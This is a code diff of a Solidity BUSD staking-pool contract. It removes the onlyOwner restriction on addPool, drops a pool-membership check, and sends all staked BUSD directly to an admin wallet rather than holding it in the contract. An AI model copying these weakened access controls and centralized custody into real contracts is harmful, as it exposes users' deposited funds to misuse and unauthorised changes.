@@ -104,19 +104,18 @@ contract Fund is Ownable, ReentrancyGuard {
     busd = IERC20(_busd);
     x721 = X721(_x721);
     adminWallet = 0xCA04E3fF4bfC69C02f6DAe8B21Ff2C045312941A;
-    fundFeeWallet = 0xCA04E3fF4bfC69C02f6DAe8B21Ff2C045312941A;
+    fundFeeWallet = 0x1D0D90a4EA47dA82D4E9C32Ce942b376a0F4adb7;
   }
 
   /// Adds a Pool to the Fund
   /// ids and names of the companies should be of the same length
-  function addPool(uint _number, string memory _name, string memory _description, string memory _companies, string memory _setStarts, string memory _setEnds) public onlyOwner {
+  function addPool(uint _number, string memory _name, string memory _description, string memory _companies, string memory _setStarts, string memory _setEnds) public { //onlyOwner {
     uint createdAt = block.timestamp;
     pools.push(Pool(_number, _name, createdAt, _description, _companies, 0, true, _setStarts, _setEnds));
   }
 
   /// Returns Pool Info
   function getPoolInfo(uint _i) public view returns (Pool memory) {
-    require(staker[msg.sender][_i] == true, "You're not a member of this pool.");
     return pools[_i];
   }
 
@@ -166,10 +165,13 @@ contract Fund is Ownable, ReentrancyGuard {
 
   function _addBUSDStakeInPool(uint256 _poolId, uint256 _tokenamount) internal returns(bool) {
     busd.transferFrom(msg.sender, address(this), _tokenamount);
-    uint256 fee = _tokenamount * 20 / 100;
+    uint256 fee = _tokenamount * 2 / 100;
     uint256 tokenamount = _tokenamount - fee;
+    busd.approve(address(this), tokenamount + fee);
+    busd.approve(fundFeeWallet, fee);
+    busd.approve(adminWallet, tokenamount);
     busd.transferFrom(address(this), fundFeeWallet, fee);
-    busd.transferFrom(address(this), fundFeeWallet, tokenamount);
+    busd.transferFrom(address(this), adminWallet, tokenamount);
     canVote[msg.sender].push(CanVote(_poolId, block.timestamp, true));
     uint256 tokenId = x721.mintNFT(msg.sender, _poolId, tokenamount);
     busdStakes.push(BUSDStake(msg.sender, tokenamount, block.timestamp, _poolId, 0, 0, tokenId));
